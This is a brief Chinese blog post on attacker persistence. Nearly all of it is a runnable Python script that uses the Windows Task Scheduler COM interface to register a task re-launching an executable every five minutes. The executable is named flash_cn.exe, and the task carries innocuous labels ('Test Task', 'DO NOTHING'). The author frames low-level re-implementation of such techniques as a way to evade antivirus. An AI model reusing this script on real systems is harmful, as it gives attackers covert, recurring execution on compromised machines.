---
title: 权限维持-py计划任务
date: 2022-03-14
categories: ["攻","权限维持"]
tags: ["权限维持"]
---

# 权限维持-py计划任务

底层还是调用api,com玩来玩去

纵观历史,从无非就是从vb,powershell,c#,以及后面的各类小众语言演变出来的调用api的维权

维权的手段就是将现有的可用权限维持的正常服务,在用底层重写一下,用以免杀

```
import datetime
import win32com.client


# create com

scheduler = win32com.client.Dispatch('Schedule.Service')
scheduler.Connect()

root_folder = scheduler.GetFolder('\\')

task_def = scheduler.NewTask(0)

# Create trigger
start_time = datetime.datetime.now() + datetime.timedelta(minutes=5)
TASK_TRIGGER_TIME = 1
TASK_IIdleTrigger = 6
trigger = task_def.Triggers.Create(TASK_IIdleTrigger)
trigger.Repetition.Interval = "PT5M"  # 每5分钟循环执行一次
trigger.Enabled = True
trigger.StartBoundary = start_time.isoformat()

# Create action
TASK_ACTION_EXEC = 0
action = task_def.Actions.Create(TASK_ACTION_EXEC)
action.ID = 'DO NOTHING'
action.Path = "C:\\Users\\ifish\\Desktop\\flash_cn.exe"
# action.Arguments = '/c "exit"'

# Set parameters
task_def.RegistrationInfo.Description = 'Test Task'
task_def.Settings.Enabled = True
task_def.Settings.StopIfGoingOnBatteries = False

# Register task
# If task already exists, it will be updated
TASK_CREATE_OR_UPDATE = 6
TASK_LOGON_NONE = 0
root_folder.RegisterTaskDefinition(
    'Test Task',  # Task name
    task_def,
    TASK_CREATE_OR_UPDATE,
    '',  # No user
    '',  # No password
    TASK_LOGON_NONE)
```